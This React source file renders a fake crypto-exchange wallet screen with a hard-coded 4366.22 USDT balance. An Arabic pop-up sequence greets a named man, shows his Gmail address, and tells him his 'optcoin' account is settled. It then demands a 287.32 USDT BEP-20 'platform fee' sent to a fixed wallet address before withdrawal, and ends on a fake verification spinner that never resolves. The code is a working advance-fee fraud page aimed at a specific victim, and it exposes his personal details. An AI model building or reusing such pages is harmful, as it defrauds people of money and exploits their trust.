
import React, { useState } from 'react';
import { Language } from './types';
import { TRANSLATIONS, Icons } from './constants';

const App: React.FC = () => {
  const [lang, setLang] = useState<Language>('ar');
  const [showBalance, setShowBalance] = useState(true);
  const [modalStep, setModalStep] = useState<number>(1); // 1 to 4
  const [walletAddress, setWalletAddress] = useState('');
  
  const t = TRANSLATIONS[lang];
  const isRTL = lang === 'ar';

  const toggleLanguage = () => setLang(prev => (prev === 'fr' ? 'ar' : 'fr'));

  const nextStep = () => setModalStep(prev => prev + 1);

  return (
    <div className={`relative flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#0b0e11] text-white overflow-hidden font-inter ${isRTL ? 'font-arabic' : ''}`} dir={isRTL ? 'rtl' : 'ltr'}>
      
      {/* Background Content with reduced blur when modal is active */}
      <div className={`flex flex-col flex-1 transition-all duration-300 ${modalStep > 0 ? 'blur-[2px] brightness-75' : ''}`}>
        {/* Header Section */}
        <header className="pt-6 px-4 pb-2 bg-gradient-to-b from-[#1c1f24] to-[#0b0e11]">
          <div className="flex justify-between items-start mb-6">
            <h1 className="text-xl font-bold">{t.headerTitle}</h1>
            <div className="text-right flex flex-col items-end">
              <button 
                onClick={toggleLanguage}
                className="flex items-center gap-1 text-[#848e9c] text-[11px] leading-tight"
              >
                <span className="font-semibold text-white text-[13px]">{t.demoAccount}</span>
                <div className="bg-[#2a2d32] p-0.5 rounded ml-1">
                  <Icons.DemoSwitch />
                </div>
              </button>
              <span className="text-[#848e9c] text-[10px]">{t.switchDemo}</span>
            </div>
          </div>

          {/* Balance Section */}
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-1">
              <span className="text-[#848e9c] text-sm">{t.totalAssets}</span>
              <button onClick={() => setShowBalance(!showBalance)} className="text-[#848e9c]">
                <Icons.Eye />
              </button>
            </div>
            
            <div className="flex items-baseline gap-2 mb-1">
              <span className="text-3xl font-bold">
                {showBalance ? '4366.22' : '****.**'}
              </span>
              <div className="flex items-center gap-1 text-[#848e9c] text-xs">
                <span className="font-semibold">USDT</span>
                <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5H7z"/></svg>
              </div>
            </div>

            <div className="flex justify-between items-center text-[11px]">
              <div className="text-[#03a66d]">
                <span className="font-medium">$109.98 (4.419%) </span>
                <span className="text-[#848e9c] opacity-80">{t.dailyProfit}</span>
              </div>
              <div className="text-right">
                <div className="text-[#848e9c] opacity-80">{t.freezeFunds}</div>
                <div className="text-[#848e9c]">$0</div>
              </div>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="grid grid-cols-4 gap-3 mb-6">
            <ActionButton icon={<Icons.Recharge />} label={t.actions.recharge} />
            <ActionButton icon={<Icons.Withdraw />} label={t.actions.withdraw} />
            <ActionButton icon={<Icons.Transfer />} label={t.actions.transfer} />
            <ActionButton icon={<Icons.Flash />} label={t.actions.flash} />
          </div>
        </header>

        {/* Account Section Tabs */}
        <div className="px-4">
          <div className="inline-block relative">
            <button className="text-[15px] font-bold text-white px-2 py-3">
              {t.myAccount}
            </button>
            <div className="absolute bottom-1 left-0 right-0 h-1 bg-[#facc15] rounded-full mx-2"></div>
          </div>
        </div>

        {/* Asset List Container */}
        <div className="flex-1 bg-[#15181d] rounded-t-[24px] px-4 pt-6 pb-20 shadow-inner">
          <div className="space-y-3">
            <AssetCard 
              title={t.assets.currency} 
              balance="$0.00" 
              percentage="0.00%" 
            />
            <AssetCard 
              title={t.assets.deliveryContract} 
              balance="$4366.22" 
              percentage="100.00%" 
              active
            />
            <AssetCard 
              title={t.assets.perpetualContract} 
              balance="$0.00" 
              percentage="0.00%" 
            />
          </div>
        </div>

        {/* Bottom Navigation */}
        <nav className="fixed bottom-0 left-0 right-0 max-w-[430px] mx-auto bg-[#1e2329] border-t border-[#2a2d32] h-[72px] px-4 flex justify-between items-center z-50">
          <NavItem icon={<Icons.Nav.Home />} label={t.nav.home} />
          <NavItem icon={<Icons.Nav.Quotes />} label={t.nav.quotes} />
          <NavItem icon={<Icons.Nav.Delivery />} label={t.nav.delivery} />
          <NavItem icon={<Icons.Nav.Durable />} label={t.nav.durable} />
          <NavItem icon={<Icons.Nav.Assets />} label={t.nav.assets} active />
        </nav>
      </div>

      {/* MODAL SYSTEM */}
      {modalStep > 0 && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/30 backdrop-blur-[1px]">
          <div className="bg-[#1e2329] border border-[#2a2d32] rounded-2xl w-full max-w-sm p-6 shadow-2xl text-center">
            {modalStep === 1 && (
              <div className="space-y-4">
                <div className="w-16 h-16 bg-[#facc15]/10 rounded-full flex items-center justify-center mx-auto mb-2">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#facc15" strokeWidth="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                </div>
                <h3 className="text-lg font-bold">أهلاً بك محمد يوسف الرفيع</h3>
                <p className="text-sm text-[#848e9c] leading-relaxed">
                  البريد الذي تم الاتفاق عليه <span className="text-white font-medium">abo.yousefff.515@gmail.com</span> تم تسوية حسابك <span className="text-[#facc15]">optcoin</span> وسيتم فتح قناة السحب.
                </p>
                <p className="text-sm text-[#848e9c] leading-relaxed">
                  اتبع التعليمات وقم بوضع رابط المنصه <span className="text-white">mini pro</span> لقسم الايداع حصراً.
                </p>
                <button 
                  onClick={nextStep}
                  className="w-full bg-[#facc15] text-[#0b0e11] font-bold py-3 rounded-xl hover:bg-[#eab308] transition-colors mt-2"
                >
                  التالي
                </button>
              </div>
            )}

            {modalStep === 2 && (
              <div className="space-y-4">
                <h3 className="text-lg font-bold">إضافة عنوان المحفظة</h3>
                <p className="text-sm text-[#848e9c]">يرجى وضع رابط محفظة BEP-20 الخاصة بك للمتابعة:</p>
                <input 
                  type="text" 
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="0x..."
                  className="w-full bg-[#0b0e11] border border-[#2a2d32] rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[#facc15] text-left"
                  dir="ltr"
                />
                <button 
                  onClick={nextStep}
                  disabled={!walletAddress}
                  className="w-full bg-[#facc15] text-[#0b0e11] font-bold py-3 rounded-xl hover:bg-[#eab308] transition-colors mt-2 disabled:opacity-50"
                >
                  التالي
                </button>
              </div>
            )}

            {modalStep === 3 && (
              <div className="space-y-4 text-right" dir="rtl">
                <h3 className="text-lg font-bold text-center">خطوة الإيداع النهائية</h3>
                <p className="text-sm text-[#848e9c] leading-relaxed">
                  أهلاً بك محمد يوسف الرفيع، بقي أمر إيداع مبلغ <span className="text-white font-bold">287.32 عملة USDT BEP-20</span> لفتح قناة السحب. 
                </p>
                <p className="text-sm text-[#848e9c] leading-relaxed">
                  بعد هذا الإيداع يحق لك سحب العملات بالكامل. هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة <span className="text-white">mini pro</span>.
                </p>
                <div className="bg-[#0b0e11] p-3 rounded-xl border border-[#2a2d32] break-all text-center">
                  <p className="text-[10px] text-[#848e9c] mb-1">عنوان الإيداع (BEP-20):</p>
                  <code className="text-[#facc15] text-xs font-mono select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
                </div>
                <button 
                  onClick={nextStep}
                  className="w-full bg-[#facc15] text-[#0b0e11] font-bold py-3 rounded-xl hover:bg-[#eab308] transition-colors mt-2"
                >
                  تم الإيداع
                </button>
              </div>
            )}

            {modalStep === 4 && (
              <div className="space-y-6 py-4">
                <div className="relative w-12 h-12 mx-auto">
                  <div className="absolute inset-0 border-4 border-[#facc15]/20 rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-[#facc15] border-t-transparent rounded-full animate-spin"></div>
                </div>
                <div className="space-y-2">
                  <h3 className="text-lg font-bold">جاري التحقق...</h3>
                  <p className="text-sm text-[#848e9c]">الرجاء الانتظار للتأكد من عملية الإيداع.</p>
                </div>
                <p className="text-[11px] text-[#848e9c] animate-pulse">قد تستغرق هذه العملية بضع دقائق</p>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

interface ActionButtonProps {
  icon: React.ReactNode;
  label: string;
}

const ActionButton: React.FC<ActionButtonProps> = ({ icon, label }) => (
  <button className="flex flex-col items-center justify-center bg-[#1e2329] rounded-xl p-3 hover:bg-[#2a2d32] transition-colors">
    {icon}
    <span className="text-[11px] text-[#848e9c] font-medium leading-tight text-center">{label}</span>
  </button>
);

interface AssetCardProps {
  title: string;
  balance: string;
  percentage: string;
  active?: boolean;
}

const AssetCard: React.FC<AssetCardProps> = ({ title, balance, percentage, active }) => (
  <div className={`bg-[#1e2329] border ${active ? 'border-[#facc15]/30 shadow-[0_0_15px_rgba(250,204,21,0.05)]' : 'border-[#2a2d32]'} rounded-xl p-4 flex justify-between items-center transition-all`}>
    <span className="text-[14px] font-bold text-white">{title}</span>
    <div className="text-right">
      <div className="text-[14px] font-bold text-white">{balance}</div>
      <div className="text-[11px] font-medium text-[#03a66d]">{percentage}</div>
    </div>
  </div>
);

interface NavItemProps {
  icon: React.ReactNode;
  label: string;
  active?: boolean;
}

const NavItem: React.FC<NavItemProps> = ({ icon, label, active }) => (
  <button className={`flex flex-col items-center gap-1 flex-1 relative ${active ? 'text-[#03a66d]' : 'text-[#848e9c]'}`}>
    <div className={`relative flex items-center justify-center ${active ? 'p-2 rounded-full bg-[#facc15] text-[#0b0e11] mb-5 -mt-6 shadow-lg border-4 border-[#1e2329]' : ''}`}>
       {active ? (
          <div className="relative">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M5 2h14v2H5V2zm0 18h14v2H5v-2zm7-14.5l6 1.5V17l-6 1.5L6 17V9l6-1.5z"/></svg>
          </div>
       ) : icon}
    </div>
    <span className={`text-[10px] font-medium ${active ? 'absolute bottom-[-10px] text-[#03a66d]' : ''}`}>
      {label}
    </span>
  </button>
);

export default App;
